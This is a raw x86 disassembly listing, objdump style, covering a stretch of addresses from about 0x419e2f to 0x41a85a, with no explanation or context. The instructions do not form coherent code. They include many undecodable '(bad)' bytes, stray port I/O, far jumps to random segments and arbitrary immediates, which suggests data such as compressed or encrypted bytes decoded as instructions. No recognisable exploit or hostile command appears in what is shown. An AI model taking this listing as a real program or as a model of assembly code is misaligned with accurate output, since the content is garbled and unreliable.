  419e2f:	popf   
  419e30:	pop    ds
  419e31:	fisttp DWORD PTR [ecx]
  419e33:	js     0x419e59
  419e35:	push   esi
  419e36:	sub    eax,0x1927e515
  419e3b:	xor    ebx,DWORD PTR [edi+0x344044f3]
  419e41:	nop
  419e42:	xchg   edi,eax
  419e43:	pushf  
  419e44:	pop    ebx
  419e45:	out    dx,al
  419e46:	add    ecx,DWORD PTR [eax+0x2f]
  419e49:	mov    WORD PTR [ebx+0x1072de6e],gs
  419e4f:	push   edi
  419e50:	jae    0x419e4c
  419e52:	(bad)  
  419e53:	pushf  
  419e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e55:	ret    0x1e35
  419e58:	addr16 gs jmp 0xa3c4:0x63bcd87a
  419e61:	dec    esi
  419e62:	xor    esi,DWORD PTR [ebp+edx*1-0x2e]
  419e66:	std    
  419e67:	inc    edi
  419e68:	add    al,BYTE PTR [edi]
  419e6a:	mov    ch,0x2a
  419e6c:	sub    eax,0x219a88c0
  419e71:	xchg   edx,eax
  419e72:	fnstenv [ebx-0x5cf82d24]
  419e78:	push   es
  419e79:	mul    cl
  419e7b:	add    eax,0x752ac870
  419e80:	mov    eax,0xc204a58f
  419e85:	jp     0x419e97
  419e87:	sub    BYTE PTR [eax],bh
  419e89:	ins    DWORD PTR es:[edi],dx
  419e8a:	mov    ss,WORD PTR [ebx]
  419e8c:	adc    al,0x39
  419e8e:	out    dx,eax
  419e8f:	mov    ds:0x90291a44,eax
  419e94:	outs   dx,DWORD PTR ds:[esi]
  419e95:	mov    ebx,0x38d8dd20
  419e9a:	jnp    0x419e70
  419e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e9d:	sub    dl,BYTE PTR [edi+0x2fd67c7e]
  419ea3:	shr    ah,1
  419ea5:	jge    0x419ee3
  419ea7:	shr    dh,1
  419ea9:	pop    ecx
  419eaa:	adc    al,0xc6
  419eac:	sub    eax,0xab18512
  419eb1:	clc    
  419eb2:	sub    al,0xd2
  419eb4:	xor    al,0x6b
  419eb6:	dec    edi
  419eb7:	add    edx,esp
  419eb9:	push   edi
  419eba:	mov    ds:0xf3d07106,eax
  419ebf:	mov    esp,0x2a86674f
  419ec4:	adc    DWORD PTR [edi-0x1ed2beba],ebx
  419eca:	imul   eax,DWORD PTR [edx+0x5e4004ac],0xd17b6a7e
  419ed4:	aam    0xd5
  419ed6:	into   
  419ed7:	jae    0x419f0c
  419ed9:	cli    
  419eda:	sbb    ah,BYTE PTR [edx]
  419edc:	test   BYTE PTR [eax],dh
  419ede:	repz rcr BYTE PTR [edx+0xe249b0],0x51
  419ee6:	jb     0x419f43
  419ee8:	sahf   
  419ee9:	inc    esp
  419eea:	mov    dl,0xc8
  419eec:	xor    DWORD PTR [esi],eax
	...
  419f56:	xchg   eax,ebx
  419f58:	pop    ss
  419f59:	lds    ebx,FWORD PTR [edi-0x31]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	push   eax
  419f63:	out    dx,eax
  419f64:	sahf   
  419f65:	dec    eax
  419f66:	addr16 pop ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	cli    
  419f6f:	mov    ecx,0x5ce6e25a
  419f74:	mov    ds:0xaff48aa1,eax
  419f79:	mov    bh,0x1f
  419f7b:	push   ebp
  419f7c:	add    BYTE PTR [edi+0x7],ah
  419f7f:	xor    DWORD PTR [ecx+0x3e515601],edi
  419f85:	xor    DWORD PTR [ecx],ecx
  419f87:	rol    DWORD PTR [eax],0x78
  419f8a:	imul   edi,DWORD PTR [ecx],0x9a21dcaa
  419f90:	stos   BYTE PTR es:[edi],al
  419f91:	jge    0x419f2d
  419f93:	mov    eax,ds:0x93f187c0
  419f98:	add    DWORD PTR [edi],0x44
  419f9b:	outs   dx,BYTE PTR ds:[esi]
  419f9c:	pop    eax
  419f9d:	push   ebx
  419f9e:	cs pop ebx
  419fa0:	push   0x824c3fe4
  419fa5:	cdq    
  419fa6:	cmp    eax,DWORD PTR [edx-0x20]
  419fa9:	loopne 0x419fea
  419fab:	mov    ecx,0xb575712e
  419fb0:	js     0x419f5a
  419fb2:	xchg   edx,eax
  419fb3:	push   ebx
  419fb4:	sbb    eax,ebp
  419fb6:	inc    edx
  419fb7:	jle    0x419f74
  419fb9:	add    eax,0x509fd118
  419fbe:	fimul  DWORD PTR [ecx-0x71]
  419fc1:	fdivr  QWORD PTR [edi]
  419fc3:	inc    eax
  419fc4:	jecxz  0x41a031
  419fc6:	test   edi,edi
  419fc8:	into   
  419fc9:	pop    ebp
  419fca:	inc    esp
  419fcb:	pushf  
  419fcc:	scas   eax,DWORD PTR es:[edi]
  419fcd:	xchg   edi,eax
  419fce:	into   
  419fcf:	scas   eax,DWORD PTR es:[edi]
  419fd0:	mov    ebx,0xd9cb2860
  419fd5:	add    BYTE PTR [edi-0x48d36927],dh
  419fdb:	xchg   esp,eax
  419fdc:	sbb    DWORD PTR [eax+0x37],ebp
  419fdf:	adc    edi,esp
  419fe1:	hlt    
  419fe2:	in     al,dx
  419fe3:	mov    DWORD PTR [ebp-0x4fb1dc6a],ecx
  419fe9:	push   ecx
  419fea:	and    dl,bl
  419fec:	shl    ebx,0x9d
  419fef:	add    BYTE PTR ds:0xd1fd152d,0xe4
  419ff6:	sub    esp,ecx
  419ff8:	rcr    BYTE PTR [edi-0x5c],cl
  419ffb:	ss dec esi
  419ffd:	ror    BYTE PTR [ebp+esi*1+0x32dbdae5],0x54
  41a005:	mov    ebp,0x78d6be80
  41a00a:	pop    ebp
  41a00b:	xchg   ebp,eax
  41a00c:	arpl   WORD PTR [ebx],cx
  41a00e:	sbb    cl,BYTE PTR ds:0xa7ad18a9
  41a014:	mov    eax,0xb0193d73
  41a019:	gs pop edi
  41a01b:	pop    eax
  41a01c:	cmp    al,0x9d
  41a01e:	xor    BYTE PTR [edi],ch
  41a020:	push   0x9c9a0f97
  41a025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a026:	push   es
  41a027:	mov    eax,ds:0xaf161861
  41a02c:	nop
  41a02d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a02e:	into   
  41a02f:	jo     0x41a09b
  41a031:	pop    esi
  41a032:	xchg   DWORD PTR [esi+0x44],ebx
  41a035:	(bad)  
  41a037:	cmp    eax,DWORD PTR [eax-0x52]
  41a03a:	or     DWORD PTR [ebx+0x4d7fc077],esp
  41a040:	sbb    eax,edi
  41a042:	and    ebx,DWORD PTR ss:[eax-0x51f7d0d6]
  41a049:	out    0x8b,eax
  41a04b:	loopne 0x41a0bc
  41a04d:	std    
  41a04e:	shl    DWORD PTR [edx],0xa
  41a051:	xlat   BYTE PTR ds:[ebx]
  41a052:	mov    al,ds:0xccef7ad7
  41a057:	cli    
  41a058:	dec    esi
  41a059:	inc    esp
  41a05a:	aas    
  41a05b:	(bad)  
  41a05c:	pop    esp
  41a05d:	sbb    ebp,esp
  41a05f:	shl    DWORD PTR [esi],cl
  41a061:	sbb    DWORD PTR [esp+esi*8-0x4d3c5663],esi
  41a068:	lahf   
  41a069:	je     0x41a02a
  41a06b:	inc    esi
  41a06c:	or     BYTE PTR ds:[eax],al
	...
  41a0d3:	add    BYTE PTR [eax],al
  41a0d5:	add    BYTE PTR [esi-0x15],cl
  41a0d8:	sub    cl,BYTE PTR [esi-0x51]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax+0x43],bh
  41a0e3:	daa    
  41a0e4:	push   ebx
  41a0e5:	sub    esp,DWORD PTR [edi+0x18]
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	add    BYTE PTR [ecx],al
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	cmp    al,0x19
  41a0f0:	retf   
  41a0f1:	fstp   QWORD PTR [ebx]
  41a0f3:	dec    ebp
  41a0f4:	cmp    dl,bh
  41a0f6:	jno    0x41a09e
  41a0f8:	dec    edx
  41a0f9:	je     0x41a0a9
  41a0fb:	int3   
  41a0fc:	dec    esp
  41a0fd:	adc    esi,edi
  41a0ff:	in     al,dx
  41a100:	sti    
  41a101:	pop    eax
  41a102:	or     esi,DWORD PTR [esi-0x43053ee]
  41a108:	and    edi,DWORD PTR [esi]
  41a10a:	out    0x1e,al
  41a10c:	jnp    0x41a0db
  41a10e:	mov    ah,BYTE PTR ds:0x365f17c2
  41a114:	fdivr  st,st(5)
  41a116:	sbb    al,0xac
  41a118:	idiv   BYTE PTR [ebx+0x3097794b]
  41a11e:	inc    esi
  41a11f:	int3   
  41a120:	mov    esi,0xe384715e
  41a125:	push   0xfb9f971c
  41a12a:	add    BYTE PTR [eax+0x62],al
  41a12d:	sbb    eax,0xb3661c1a
  41a132:	xchg   ebx,eax
  41a133:	test   eax,0xfcd8f1f3
  41a138:	enter  0x197c,0x64
  41a13c:	or     ebp,esi
  41a13e:	out    0x85,eax
  41a140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a141:	sbb    esp,ebp
  41a143:	jnp    0x41a19d
  41a145:	pop    es
  41a146:	add    BYTE PTR [edx-0x36],dh
  41a149:	dec    eax
  41a14a:	fistp  WORD PTR [ebp+0x30233e94]
  41a150:	mov    dl,0x3a
  41a152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a153:	fimul  DWORD PTR [eax+0x2cb95e6d]
  41a159:	imul   ecx,DWORD PTR [esi+0x7f062256],0xffffffbc
  41a160:	cli    
  41a161:	sbb    DWORD PTR [ebx-0x46],ebp
  41a164:	stc    
  41a165:	popf   
  41a166:	sahf   
  41a167:	cmp    BYTE PTR [ebp+0x46],ch
  41a16a:	lock data16 loop 0x41a143
  41a16e:	or     bl,dl
  41a170:	lods   al,BYTE PTR ds:[esi]
  41a171:	cli    
  41a172:	push   eax
  41a173:	and    ecx,esi
  41a175:	outs   dx,DWORD PTR ds:[esi]
  41a176:	es clc 
  41a178:	inc    esp
  41a179:	xchg   ecx,eax
  41a17a:	test   eax,0x6ac4c6e6
  41a17f:	jmp    DWORD PTR [ebp+edi*1-0x1b]
  41a183:	(bad)  
  41a184:	in     eax,dx
  41a185:	retf   0x90b1
  41a188:	push   cs
  41a189:	adc    al,0x90
  41a18b:	and    BYTE PTR [esi+0x5b],0x30
  41a18f:	cmc    
  41a190:	adc    cl,BYTE PTR [esi+0x2b626129]
  41a196:	aas    
  41a197:	aas    
  41a198:	and    ah,BYTE PTR [ecx]
  41a19a:	nop
  41a19b:	aaa    
  41a19c:	fbld   TBYTE PTR [esp+eax*4+0x31502b78]
  41a1a3:	outs   dx,DWORD PTR ds:[esi]
  41a1a4:	jb     0x41a172
  41a1a6:	test   al,0x6e
  41a1a8:	call   FWORD PTR [ecx-0x6414acbd]
  41a1ae:	sub    esi,DWORD PTR [edi]
  41a1b0:	mov    ebp,0x7cfe0e20
  41a1b5:	sub    ebp,DWORD PTR [esp+ecx*1+0x2f28cd61]
  41a1bc:	cli    
  41a1bd:	jge    0x41a158
  41a1bf:	(bad)  ds:0x2e5e7f65
  41a1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1c6:	pop    es
  41a1c7:	jnp    0x41a205
  41a1c9:	jo     0x41a226
  41a1cb:	add    al,0xd2
  41a1cd:	int    0x2d
  41a1cf:	out    0x74,eax
  41a1d1:	imul   DWORD PTR [ebp-0x1f]
  41a1d4:	sub    eax,0x3927e379
  41a1d9:	ret    
  41a1da:	pop    es
  41a1db:	into   
  41a1dc:	xchg   BYTE PTR [edi+ecx*1-0x69aa766],dh
  41a1e3:	jmp    0x37adadf9
  41a1e8:	fnstenv [ebx+esi*2+0x17]
  41a1ec:	call   0x41a2a5
	...
  41a255:	add    BYTE PTR [esp+ecx*1],bl
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	sbb    bh,dh
  41a264:	xor    eax,0x1196792
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR [edx+0x52],dl
  41a270:	mov    ecx,0x2a9b9bd4
  41a275:	fs ins BYTE PTR es:[edi],dx
  41a277:	inc    edi
  41a278:	add    DWORD PTR [ecx],esp
  41a27a:	arpl   WORD PTR [ecx-0x42],bx
  41a27d:	je     0x41a21a
  41a27f:	stos   BYTE PTR es:[edi],al
  41a280:	sbb    al,0xf
  41a282:	mov    eax,0xd329e79b
  41a287:	add    BYTE PTR [eax],bl
  41a289:	mov    cl,0x57
  41a28b:	mov    ?,WORD PTR [ebx+0x69]
  41a28e:	mov    al,0x27
  41a290:	(bad)  
  41a291:	pop    ecx
  41a292:	jge    0x41a2fc
  41a294:	add    DWORD PTR [ecx],0x7a
  41a297:	xor    eax,0x6ca5328
  41a29c:	dec    ebp
  41a29d:	xchg   esp,eax
  41a29e:	retf   0xee77
  41a2a1:	test   al,0xaa
  41a2a3:	(bad)  
  41a2a4:	mov    edx,ecx
  41a2a6:	xchg   DWORD PTR [ebp+0x4f],ecx
  41a2a9:	jbe    0x41a31e
  41a2ab:	mov    edx,0x9f4e5315
  41a2b0:	inc    edx
  41a2b1:	scas   eax,DWORD PTR es:[edi]
  41a2b2:	pop    eax
  41a2b3:	pop    esp
  41a2b4:	sbb    eax,0x92e88e03
  41a2b9:	out    dx,eax
  41a2ba:	jne    0x41a270
  41a2bc:	dec    ecx
  41a2bd:	adc    eax,DWORD PTR [esi]
  41a2bf:	mov    ds:0xaf3c68d7,eax
  41a2c4:	data16 loop 0x41a28f
  41a2c7:	cdq    
  41a2c8:	jle    0x41a2e5
  41a2ca:	lahf   
  41a2cb:	push   edx
  41a2cc:	jmp    0x9ea2f984
  41a2d1:	mov    BYTE PTR [ecx],al
  41a2d3:	and    DWORD PTR [edi-0x39451173],edi
  41a2d9:	sbb    BYTE PTR [ecx+0x4a20f93f],bl
  41a2df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2e0:	sub    esi,DWORD PTR [edx+0x7ed51e95]
  41a2e6:	in     al,dx
  41a2e7:	jne    0x41a32d
  41a2e9:	jmp    0xedc5:0xf656b6d1
  41a2f0:	jae    0x41a369
  41a2f2:	pop    esp
  41a2f3:	inc    BYTE PTR [edi]
  41a2f5:	scas   eax,DWORD PTR es:[edi]
  41a2f6:	mov    WORD PTR ds:0xdcbe9c55,gs
  41a2fc:	retf   
  41a2fd:	iret   
  41a2fe:	inc    eax
  41a2ff:	out    dx,eax
  41a300:	push   cs
  41a301:	pop    esi
  41a302:	(bad)  
  41a303:	ffreep st(3)
  41a305:	inc    eax
  41a306:	leave  
  41a307:	jge    0x41a380
  41a309:	adc    bh,BYTE PTR [esi+0x19]
  41a30c:	out    dx,eax
  41a30d:	call   0xd157:0xac27518c
  41a314:	mov    al,0xd6
  41a316:	xor    DWORD PTR [edi+0x11],0xdc721ee
  41a31d:	jnp    0x41a2ff
  41a31f:	xchg   edx,eax
  41a320:	or     bl,BYTE PTR [ebx-0x22f78fe8]
  41a326:	cmp    ch,al
  41a328:	pushf  
  41a329:	int3   
  41a32a:	cmp    BYTE PTR [ecx],dl
  41a32c:	mov    DWORD PTR [eax],edi
  41a32e:	call   0x5ee8:0x9c1092c6
  41a335:	mov    dl,0x5e
  41a337:	sub    al,0xcb
  41a339:	fimul  DWORD PTR [esi]
  41a33b:	mov    ah,BYTE PTR [eax-0x10]
  41a33e:	aas    
  41a33f:	inc    esp
  41a340:	repz xor eax,0x2b44fe06
  41a346:	push   ecx
  41a347:	mov    dh,0xfd
  41a349:	into   
  41a34a:	pop    esi
  41a34b:	enter  0x51fb,0xcf
  41a34f:	stos   DWORD PTR es:[edi],eax
  41a350:	and    dh,ch
  41a352:	inc    esp
  41a353:	ror    ebp,0x47
  41a356:	cmp    cl,BYTE PTR [ebx+0x6a]
  41a359:	pop    edx
  41a35a:	push   ecx
  41a35b:	je     0x41a3a2
  41a35d:	push   0xfffffff8
  41a35f:	sub    eax,0xcddfedc3
  41a364:	xchg   ebp,eax
  41a365:	add    ebx,DWORD PTR [eax]
  41a367:	leave  
  41a368:	cmp    BYTE PTR ss:[ecx+0x54],0x72
  41a36d:	scas   al,BYTE PTR es:[edi]
	...
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	mov    bl,0x6c
  41a3e4:	cmp    al,0xcd
  41a3e6:	sbb    al,BYTE PTR [bx+di]
  41a3e9:	add    BYTE PTR [eax],al
  41a3eb:	add    DWORD PTR [eax],eax
  41a3ed:	add    BYTE PTR [eax+0x2d5f6abb],ch
  41a3f3:	mov    ah,0x8f
  41a3f5:	sub    edx,DWORD PTR [esi]
  41a3f7:	sbb    al,0xf0
  41a3f9:	push   ebx
  41a3fa:	pop    edx
  41a3fb:	cmp    al,0x3e
  41a3fd:	cwde   
  41a3fe:	ss add al,0xb9
  41a401:	shl    bh,cl
  41a403:	xor    BYTE PTR [edi-0x3dc2c04d],0x2f
  41a40a:	(bad)  
  41a40b:	pop    esp
  41a40c:	jae    0x41a47e
  41a40e:	shl    al,0x8a
  41a411:	repz adc ecx,esi
  41a414:	lods   al,BYTE PTR ds:[esi]
  41a415:	xchg   esp,eax
  41a416:	sub    DWORD PTR [esi+0x5a],0x4cca24df
  41a41d:	int    0x4d
  41a41f:	(bad)
  41a422:	and    eax,0x77357c63
  41a427:	jmp    0x20c2:0x156e33ba
  41a42e:	jbe    0x41a458
  41a430:	shl    BYTE PTR [ebx-0x22c341fb],0xf1
  41a437:	push   ss
  41a438:	ror    BYTE PTR [eax],cl
  41a43a:	xchg   BYTE PTR [edi+0x7d3d420d],bh
  41a440:	gs call 0xb3f16e1e
  41a446:	jb     0x41a4a4
  41a448:	push   ss
  41a449:	repz pop ebp
  41a44b:	out    dx,eax
  41a44c:	push   esp
  41a44d:	aad    0x44
  41a44f:	sbb    BYTE PTR [esi-0x63],dl
  41a452:	and    esi,eax
  41a454:	dec    esi
  41a455:	mov    bl,0x17
  41a457:	popf   
  41a458:	adc    BYTE PTR [ecx+0x39535478],dh
  41a45e:	addr16 (bad) 
  41a460:	fild   DWORD PTR [ebp-0x27f30a7]
  41a466:	aam    0x28
  41a468:	bound  eax,QWORD PTR [ecx]
  41a46a:	lea    edi,[edi-0x16ef6fee]
  41a470:	pop    ebp
  41a471:	js     0x41a478
  41a473:	adc    DWORD PTR [edi-0x18],esi
  41a476:	cdq    
  41a477:	sti    
  41a478:	inc    eax
  41a479:	sbb    eax,edi
  41a47b:	xchg   ecx,eax
  41a47c:	mov    al,ds:0x954bb08e
  41a481:	sbb    BYTE PTR [eax],dl
  41a483:	or     ebx,ecx
  41a485:	cmp    al,cl
  41a487:	test   eax,0x19fb4707
  41a48c:	ja     0x41a458
  41a48e:	cmp    ebx,DWORD PTR [eax-0x2b]
  41a491:	mov    ?,WORD PTR [edx+0x39cd8e4f]
  41a497:	dec    ecx
  41a498:	das    
  41a499:	lds    edx,FWORD PTR [ecx]
  41a49b:	shl    eax,1
  41a49d:	pop    ss
  41a49e:	jno    0x41a4b8
  41a4a0:	shl    BYTE PTR [edi],cl
  41a4a2:	mov    ds:0x290661e9,al
  41a4a7:	dec    eax
  41a4a8:	adc    dl,ah
  41a4aa:	int    0xfc
  41a4ac:	sbb    ebp,DWORD PTR [ebx]
  41a4ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4af:	mov    ah,0xee
  41a4b1:	aad    0x6e
  41a4b3:	mov    cl,0x9
  41a4b5:	jle    0x41a4eb
  41a4b7:	mov    WORD PTR [eax-0x61],fs
  41a4ba:	lds    eax,FWORD PTR [edi]
  41a4bc:	aas    
  41a4bd:	xchg   ebx,eax
  41a4be:	and    bh,BYTE PTR [ecx+0x5a]
  41a4c1:	jg     0x41a513
  41a4c3:	xchg   esp,eax
  41a4c4:	and    DWORD PTR [esp+edi*4-0x76],edi
  41a4c8:	test   DWORD PTR [ebp-0x28b5c856],esi
  41a4ce:	test   eax,0x567fa264
  41a4d3:	jl     0x41a4ce
  41a4d5:	icebp  
  41a4d6:	push   ecx
  41a4d7:	jnp    0x41a48d
  41a4d9:	sbb    BYTE PTR [esp+edx*4],bh
  41a4dc:	int3   
  41a4dd:	mov    dl,0xf0
  41a4df:	stc    
  41a4e0:	sub    BYTE PTR [esp+edx*1-0x38aa1de9],dh
  41a4e7:	(bad)  
  41a4e8:	stos   DWORD PTR es:[edi],eax
  41a4e9:	ins    BYTE PTR es:[edi],dx
  41a4ea:	mov    bh,0xc6
  41a4ec:	jno    0x41a493
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	mov    cl,0xfc
  41a564:	xor    dh,BYTE PTR [eax+0x11b67]
  41a56a:	add    BYTE PTR [ecx],al
  41a56c:	add    BYTE PTR [eax],al
  41a56e:	jae    0x41a5cc
  41a570:	xor    BYTE PTR [ecx],ch
  41a572:	fdivrp st(4),st
  41a574:	call   0x69a59d8a
  41a579:	add    ebx,esp
  41a57b:	adc    ebx,edi
  41a57d:	xor    edi,DWORD PTR [esi]
  41a57f:	mov    dl,0x43
  41a581:	dec    edi
  41a582:	in     al,0x82
  41a584:	sbb    ch,BYTE PTR [eax-0x26040c3]
  41a58a:	es hlt 
  41a58c:	dec    edi
  41a58d:	mov    ch,0x89
  41a58f:	xchg   ebx,eax
  41a590:	pop    es
  41a591:	xchg   DWORD PTR [ebp+0x50982cc4],eax
  41a597:	sbb    al,0xc4
  41a599:	mov    ds,WORD PTR [esi-0x36]
  41a59c:	jge    0x41a5fb
  41a59e:	jp     0x41a58d
  41a5a0:	or     BYTE PTR [ecx-0x23c3feff],ch
  41a5a6:	xchg   ebx,eax
  41a5a7:	scas   eax,DWORD PTR es:[edi]
  41a5a8:	cmp    si,di
  41a5ab:	cdq    
  41a5ac:	xchg   DWORD PTR [edi],edx
  41a5ae:	dec    eax
  41a5af:	out    dx,eax
  41a5b0:	ins    DWORD PTR es:[edi],dx
  41a5b1:	mov    BYTE PTR fs:0xd5abda80,bl
  41a5b8:	mov    esi,0x301f1c7a
  41a5bd:	nop    ebp
  41a5c0:	repnz call 0xdb4a:0xf136b2a4
  41a5c8:	(bad)
  41a5cb:	push   eax
  41a5cc:	push   0xe1b73f41
  41a5d1:	dec    edi
  41a5d2:	inc    eax
  41a5d3:	xchg   DWORD PTR [edx-0x46a769df],esp
  41a5d9:	jae    0x41a645
  41a5db:	mov    edx,0xfefff962
  41a5e0:	sahf   
  41a5e1:	lea    esp,[esi+0x48]
  41a5e4:	xchg   BYTE PTR ds:0x94bcea79,ah
  41a5ea:	dec    edi
  41a5eb:	(bad)  
  41a5ec:	cmp    dh,BYTE PTR ss:[edx]
  41a5ef:	clc    
  41a5f0:	push   ebx
  41a5f1:	xor    dh,BYTE PTR [esi+0x5716f737]
  41a5f7:	sub    eax,0xed7ef9b6
  41a5fc:	xor    eax,0xa5ad8652
  41a601:	cmp    eax,0x5d76b3e2
  41a606:	mov    ah,0x76
  41a608:	addr16 (bad) 
  41a60b:	jmp    0xca25:0xc9527a05
  41a612:	sub    eax,0xec8b4209
  41a617:	outs   dx,BYTE PTR ds:[esi]
  41a618:	jmp    0x801a35b0
  41a61d:	and    eax,0xe949f35e
  41a622:	aad    0x2d
  41a624:	pop    ds
  41a625:	cmp    DWORD PTR [ebp-0x3ae417ef],0x1e5e100d
  41a62f:	in     eax,0x34
  41a631:	mov    dh,0x20
  41a633:	jl     0x41a649
  41a635:	inc    esp
  41a636:	stos   BYTE PTR es:[edi],al
  41a637:	and    eax,0x4d2cb1d0
  41a63c:	pop    ss
  41a63d:	(bad)  
  41a63e:	pop    ebp
  41a63f:	xor    ah,al
  41a641:	adc    si,WORD PTR [eax+0x1d]
  41a645:	outs   dx,BYTE PTR ss:[esi]
  41a647:	adc    eax,0xae292165
  41a64c:	call   0xa0d67e65
  41a651:	cmp    ebp,DWORD PTR [esi]
  41a653:	dec    edx
  41a654:	push   es
  41a655:	das    
  41a656:	clc    
  41a657:	(bad)  
  41a658:	popa   
  41a659:	mov    ebp,0x787a8763
  41a65e:	int3   
  41a65f:	mov    esi,ebp
  41a661:	xor    DWORD PTR [edx+0x78c1bdb4],eax
  41a667:	sub    cl,BYTE PTR [edx+0x7d]
  41a66a:	std    
  41a66b:	je     0x41a6d2
  41a66d:	add    DWORD PTR [eax],0x0
	...
  41a6d3:	add    BYTE PTR [eax],al
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x8f76a625
  41a6e4:	pop    edi
  41a6e5:	mov    ch,0x67
  41a6e7:	sbb    al,0x1
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    BYTE PTR [edx],al
  41a6ef:	pop    esp
  41a6f0:	and    edi,edi
  41a6f2:	(bad)  
  41a6f3:	sbb    eax,0xd73c82c7
  41a6f8:	je     0x41a6a1
  41a6fa:	and    edi,DWORD PTR [edx-0x36]
  41a6fd:	mov    ss,WORD PTR [ecx]
  41a6ff:	test   edi,ebx
  41a701:	popf   
  41a702:	aas    
  41a703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a704:	cmp    al,0x8a
  41a706:	sti    
  41a707:	sbb    BYTE PTR [esi+eiz*8],dl
  41a70a:	cmp    al,0x6a
  41a70c:	div    DWORD PTR [eax+0x26969621]
  41a712:	jmp    0x41a745
  41a714:	mov    WORD PTR [ebp-0x41],?
  41a717:	aaa    
  41a718:	pop    ds
  41a719:	push   0xffffff8d
  41a71b:	inc    ecx
  41a71c:	mov    al,ds:0x5b50854d
  41a721:	retf   
  41a722:	jle    0x41a6b4
  41a724:	jae    0x41a71c
  41a726:	xchg   ecx,eax
  41a727:	cmc    
  41a728:	mov    ds:0x93c5100e,eax
  41a72d:	and    eax,DWORD PTR [ebx-0x4f]
  41a730:	jb     0x41a738
  41a732:	push   cs
  41a733:	div    BYTE PTR [eax-0x80]
  41a736:	in     eax,dx
  41a737:	(bad)  
  41a738:	mov    edx,0x223dce6
  41a73d:	adc    DWORD PTR [ecx+0x41e2df9e],esp
  41a743:	jns    0x41a74a
  41a745:	dec    esi
  41a746:	and    DWORD PTR [edi],eax
  41a748:	int    0xb3
  41a74a:	mov    al,0x36
  41a74c:	or     BYTE PTR [ebx],0xe
  41a74f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a750:	hlt    
  41a751:	popf   
  41a752:	cwde   
  41a753:	adc    eax,0xc1110f22
  41a758:	out    0x83,al
  41a75a:	sbb    dh,dh
  41a75c:	scas   al,BYTE PTR es:[edi]
  41a75d:	out    0x8a,eax
  41a75f:	inc    eax
  41a760:	sbb    DWORD PTR [edi-0x3f],ebp
  41a763:	daa    
  41a764:	dec    ebp
  41a765:	frstor [ebx-0x67]
  41a768:	das    
  41a769:	inc    edi
  41a76a:	test   DWORD PTR [eax+0x4f],ebp
  41a76d:	bnd jnp 0x41a736
  41a770:	cmp    esi,DWORD PTR ds:0x47b0132e
  41a776:	jmp    DWORD PTR [edx]
  41a778:	adc    dh,0x3
  41a77b:	retf   0x9bcb
  41a77e:	icebp  
  41a77f:	leave  
  41a780:	mov    ebx,0x4276064e
  41a785:	sbb    eax,0x15d9df97
  41a78a:	jne    0x41a70c
  41a78c:	scas   eax,DWORD PTR es:[edi]
  41a78d:	jp     0x41a7a3
  41a78f:	jecxz  0x41a74e
  41a791:	test   DWORD PTR [ebx+0x2d],0x59cc4d7c
  41a798:	sar    dh,1
  41a79a:	or     dh,BYTE PTR [edx+0x5f1c8d38]
  41a7a0:	adc    dh,ch
  41a7a2:	jmp    DWORD PTR [edi]
  41a7a4:	inc    edi
  41a7a5:	stos   DWORD PTR es:[edi],eax
  41a7a6:	dec    edx
  41a7a7:	test   edx,0x6ccd52c2
  41a7ad:	outs   dx,DWORD PTR ds:[esi]
  41a7ae:	push   ecx
  41a7af:	retf   0xe40a
  41a7b2:	imul   edi,edi,0x2
  41a7b5:	adc    al,0xe5
  41a7b7:	test   al,0x4
  41a7b9:	mov    edi,0x9b77308b
  41a7be:	xchg   ecx,eax
  41a7bf:	(bad)  
  41a7c0:	repz xor al,0x22
  41a7c3:	pusha  
  41a7c4:	push   edx
  41a7c5:	or     al,0xf2
  41a7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7c8:	sbb    ch,BYTE PTR [edx+ecx*1]
  41a7cb:	adc    eax,0xe40d1bdd
  41a7d0:	in     al,dx
  41a7d1:	addr16 fdivrp st(6),st
  41a7d4:	lods   eax,DWORD PTR ds:[esi]
  41a7d5:	mov    es,WORD PTR [ecx-0x15b393f7]
  41a7db:	mov    edx,0x35680806
  41a7e0:	push   0xffffffb2
  41a7e2:	out    dx,al
  41a7e3:	outs   dx,BYTE PTR ds:[esi]
  41a7e4:	fnstcw WORD PTR [edx+eiz*2+0x2b]
  41a7e8:	mov    ebp,0x551df6c4
  41a7ed:	iret   
	...
  41a856:	repz xchg edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
